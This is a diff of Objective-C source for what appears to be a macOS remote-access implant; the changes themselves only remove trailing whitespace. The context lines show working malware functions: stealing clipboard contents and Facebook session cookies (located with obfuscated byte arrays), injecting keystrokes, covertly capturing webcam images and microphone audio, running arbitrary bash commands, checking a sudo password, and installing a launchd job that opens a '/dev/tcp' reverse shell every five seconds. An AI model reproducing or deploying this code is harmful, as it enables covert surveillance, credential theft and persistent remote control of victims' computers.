@@ -123,7 +123,7 @@ bool sysTaskRunning = false;
     [self sendString:[NSString stringWithFormat:@"%lld (seconds)",idlesecs]];
     [self term];
 }
-    
+
 -(void)getPasteBoard {
     NSPasteboard *myPasteboard  = [NSPasteboard generalPasteboard];
     NSString *contents = [myPasteboard  stringForType:NSPasteboardTypeString];
@@ -133,7 +133,7 @@ bool sysTaskRunning = false;
     [self sendString:contents];
     [self term];
 }
-    
+
 -(void)keyStroke:(NSString *)key {
     NSString *keyCommand = [NSString stringWithFormat:@"tell application \"System Events\"\nkeystroke \"%@\"\nend tell",key];
     [self runAppleScript:keyCommand];
@@ -147,7 +147,7 @@ bool sysTaskRunning = false;
         0x73, 0x65, 0x72, 0x00, 0x2f, 0x00};
     NSString *cuser = [NSString stringWithFormat:@"%s",parseBinary(fb_cuser,22)];
     result = [NSString stringWithFormat:@"c_user = %@\n",cuser];
-    
+
     int fb_xs[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6F, 0x6F, 0x6B,
         0x2E, 0x63, 0x6F, 0x6D, 0x00, 0x78, 0x73, 0x00,
         0x2f, 0x00}; //facebook.com xs /
@@ -169,7 +169,7 @@ bool sysTaskRunning = false;
     NSNumber *compressionFactor = [NSNumber numberWithFloat:0.9];
     NSDictionary *imageProps = [NSDictionary dictionaryWithObject:compressionFactor forKey:NSImageCompressionFactor];
     imageData = [imageRep representationUsingType:NSJPEGFileType properties:imageProps];
-    
+
     NSMutableDictionary *result = [[NSMutableDictionary alloc] init];
     if (imageData != nil) {
         [result setValue:[NSNumber numberWithInt:(int)imageData.length] forKey:@"size"];
@@ -184,7 +184,7 @@ bool sysTaskRunning = false;
         [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
         [self term];
     }
-    
+
 }
 
 -(void)getProcessId {
@@ -200,31 +200,31 @@ bool sysTaskRunning = false;
     io_iterator_t           iterator    = IO_OBJECT_NULL;
     io_object_t             service     = IO_OBJECT_NULL;
     CFDataRef               result      = NULL;
-    
+
     matching = IOBSDNameMatching( kIOMasterPortDefault, 0, "en0" );
     if ( matching == NULL )
     {
         fprintf( stderr, "IOBSDNameMatching() returned empty dictionary\n" );
         return ( NULL );
     }
-    
+
     kr = IOServiceGetMatchingServices( kIOMasterPortDefault, matching, &iterator );
     if ( kr != KERN_SUCCESS )
     {
         fprintf( stderr, "IOServiceGetMatchingServices() returned %d\n", kr );
         return ( NULL );
     }
-    
+
     while ( (service = IOIteratorNext(iterator)) != IO_OBJECT_NULL )
     {
         io_object_t parent = IO_OBJECT_NULL;
-        
+
         kr = IORegistryEntryGetParentEntry( service, kIOServicePlane, &parent );
         if ( kr == KERN_SUCCESS )
         {
             if ( result != NULL )
                 CFRelease( result );
-            
+
             result = IORegistryEntryCreateCFProperty( parent, CFSTR("IOMACAddress"), kCFAllocatorDefault, 0 );
             IOObjectRelease( parent );
         }
@@ -232,16 +232,16 @@ bool sysTaskRunning = false;
         {
             fprintf( stderr, "IORegistryGetParentEntry returned %d\n", kr );
         }
-        
+
         IOObjectRelease( service );
     }
-    
+
     NSData * macData = (__bridge NSData *)(result);
     if ( [macData length] == 0 )
         return ( nil );
-    
+
     const UInt8 *bytes = [macData bytes];
-    
+
     NSMutableString *resultMutableString = [NSMutableString string];
     for ( NSUInteger i = 0; i < [macData length]; i++ )
     {
@@ -262,12 +262,12 @@ bool sysTaskRunning = false;
     }
     const int kMaxDisplays = 16;
     const CFStringRef kDisplayBrightness = CFSTR(kIODisplayBrightnessKey);
-    
+
     CGDirectDisplayID display[kMaxDisplays];
     CGDisplayCount numDisplays;
     CGDisplayErr err;
     err = CGGetActiveDisplayList(kMaxDisplays, display, &numDisplays);
-    
+
     if (err != CGDisplayNoErr) {
         [self term];
         return;
@@ -276,7 +276,7 @@ bool sysTaskRunning = false;
         CGDirectDisplayID dspy = display[i];
         CFDictionaryRef originalMode = CGDisplayCurrentMode(dspy);
         io_service_t service = CGDisplayIOServicePort(dspy);
-        
+
         float brightness;
         err= IODisplayGetFloatParameter(service,
                                         kNilOptions, kDisplayBrightness,
@@ -296,7 +296,7 @@ bool sysTaskRunning = false;
         } else {
             [self.audioRecorder record];
             [self sendString:@"Listening..."];
-            
+
         }
     } else if ([arg isEqualTo:@"stop"]) {
         if ([self.audioRecorder isRecording]) {
@@ -322,14 +322,14 @@ bool sysTaskRunning = false;
     self.audioRecorder = [[AVAudioRecorder alloc] initWithURL: soundFile settings: soundSetting error: &error];
 }
 
-    
+
 -(bool)initcamera {
     self.session = [[AVCaptureSession alloc] init];
     self.session.sessionPreset = AVCaptureSessionPreset352x288;
     AVCaptureDevice *device = nil;
     NSError *error = nil;
     device = [self getcapturedevice];
-    
+
     AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device error:&error];
     if (!input) {
         NSLog(@"ERROR: trying to open camera: %@", error);
@@ -350,7 +350,7 @@ bool sysTaskRunning = false;
     if ([self initcamera] == false) {
         return imageData(nil);
     }
-    
+
     AVCaptureConnection* videoConnection = nil;
     for (AVCaptureConnection* connection in self.stillImageOutput.connections)
     {
@@ -368,7 +368,7 @@ bool sysTaskRunning = false;
     if (videoConnection == nil) {
         return imageData(nil);
     }
-    
+
     //capture still image from video connection
     [self.stillImageOutput captureStillImageAsynchronouslyFromConnection:videoConnection completionHandler: ^(CMSampleBufferRef imageSampleBuffer, NSError *error)
      {
@@ -379,10 +379,10 @@ bool sysTaskRunning = false;
              AVCaptureVideoDataOutput* output = (AVCaptureVideoDataOutput*)[self.session.outputs objectAtIndex:0];
              [self.session removeOutput:output];
          });
-         
+
          if (error)
              imageData(nil);
-         
+
          NSData* data = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageSampleBuffer];
          if (data) {
              imageData(data);
@@ -402,10 +402,10 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
     long cookieJarSize = ftell(cookieJar);
     int pos = 0; int curSearch = 0;int curChar;
     fseek(cookieJar, 0, 0);
-    
+
     while(pos <= cookieJarSize) {
         curChar = getc(cookieJar);pos++;
-        
+
         if(curChar == searchChars[curSearch]) { /* found a match */
             curSearch++;                        /* search for next char */
             if(curSearch > sizeOfSearch - 1) {                 /* found the whole string! */
@@ -413,7 +413,7 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
                 fread(lastBytes,1,64,cookieJar); /* read 5 bytes */
                 return lastBytes;
             }
-            
+
         } else { /* didn't find a match */
             if (curSearch > 18) {
                 printf("fuck %d\n",searchChars[curSearch]);
@@ -439,7 +439,7 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
             //send json, send term
             [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
             [self term];
-            
+
             //receive term, send data, and then new term
             [self sendData:data];
         }
@@ -528,7 +528,7 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
                     [_systask setLaunchPath:@"/bin/bash"];
                     [_systask setArguments:@[ @"-c", object]];
                     [_systask setCurrentDirectoryPath:[fileManager currentDirectoryPath]];
-                    
+
                     NSPipe *stdoutPipe = [NSPipe pipe];
                     stdinPipe = [NSPipe pipe];
                     [_systask setStandardInput:stdinPipe];
@@ -568,11 +568,11 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
     [_systask setLaunchPath:@"/bin/bash"];
     [_systask setArguments:@[ @"-c", [NSString stringWithFormat:@"echo '%@' | sudo -S whoami",pass]]];
     [_systask setCurrentDirectoryPath:[fileManager currentDirectoryPath]];
-    
+
     NSPipe *stdoutPipe = [NSPipe pipe];
     [_systask setStandardOutput:stdoutPipe];
     [_systask setStandardError:stdoutPipe];
-    
+
     NSFileHandle *stdoutHandle = [stdoutPipe fileHandleForReading];
     [stdoutHandle waitForDataInBackgroundAndNotify];
     id observer = [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
@@ -582,7 +582,7 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
                        NSData *dataRead = [stdoutHandle availableData];
                        NSString *newOutput = [[NSString alloc] initWithData:dataRead encoding:NSUTF8StringEncoding];
                        result = [NSString stringWithFormat:@"%@%@",result,newOutput];
-                       
+
                        [stdoutHandle waitForDataInBackgroundAndNotify];
                    }];
     [_systask launch];
@@ -597,7 +597,7 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
         exit(0);
     }
 }
-    
+
 -(void)debugLog:(NSString *)string {
     system([[NSString stringWithFormat:@"echo '%@' >> /tmp/esplog",string] UTF8String]);
 }
@@ -626,7 +626,7 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
                         [NSArray arrayWithObjects: [NSNumber numberWithBool: YES],@"com.apple.espl",[NSNumber numberWithInt:5],[NSNumber numberWithBool: YES],
                          [NSArray arrayWithObjects:@"sh",@"-c",[NSString stringWithFormat:@"bash &> /dev/tcp/%@/%d 0>&1",ip,port], nil], nil]
                         forKeys:[NSArray arrayWithObjects:@"AbandonProcessGroup",@"Label",@"StartInterval",@"RunAtLoad",@"ProgramArguments", nil]];
-        
+
         NSError *err;
         NSData *plistData = [NSPropertyListSerialization dataWithPropertyList:innerDict format:NSPropertyListXMLFormat_v1_0 options:0 error:&err];
         if (err) {
